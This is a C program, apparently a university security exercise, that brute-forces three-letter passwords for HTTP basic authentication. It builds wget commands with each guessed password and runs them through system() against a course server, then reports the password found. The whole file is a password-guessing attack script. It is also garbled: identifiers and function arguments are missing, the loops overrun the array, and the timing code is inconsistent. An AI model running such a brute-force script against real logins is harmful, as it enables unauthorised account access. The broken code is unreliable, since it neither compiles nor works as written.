#include<stdio.h>
#include<stdlib.h>
#include<strings.h>
#include<ctype.h>
#include <sys/time.h>
#define OneBillion 1e9


int ()
{   int startTime, stopTime, final;
    int i,j,k;
    int pass,count=0;
    char arr[52] ={'A','a','B','b','C','c','D','d','E','e','F','f','G','g','H','h','I','i','J','j','K','k','L','l','M','m','N','n','O','o','P','p','Q','q','R','r','S','s','T','t','U','u','V','v','W','w','X','x','Y','y','Z','z'};
    char [4];
    char url1[100];
    char url2[100];

    startTime = time();
   for (i=0;i<=52;i++)
   {

     for (j=0;j<=52;j++)
       {

	for(k=0;k<=52;k++)

	  { 
	     count++;
             [0] = arr[i];
	     [1] = arr[j];
	     [2] = arr[k];
	     [3] = '\0';


	     printf("Checking for the word :%s\n",);
	     strcpy(url1 ,"wget --http-user= --http-passwd=");
	     strcpy(url2 , " -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/ ");
	     strcat(url1,);
	     strcat(url1,url2);


	     pass = system(url1);
	     if (pass == 0)
	     {   
                printf("Success\n");
		printf("Number of attempts = %d\n",count);
	        stopTime = time();

                final = stopTime-startTime;
		printf("The password for the user  : %s\n",); 
                printf(" Cracked the password in %lld nanoseconds (%1f seconds) \n",final,(double)final/OneBillion);
	        
		exit(1);}


	      }
        }

   }
 }


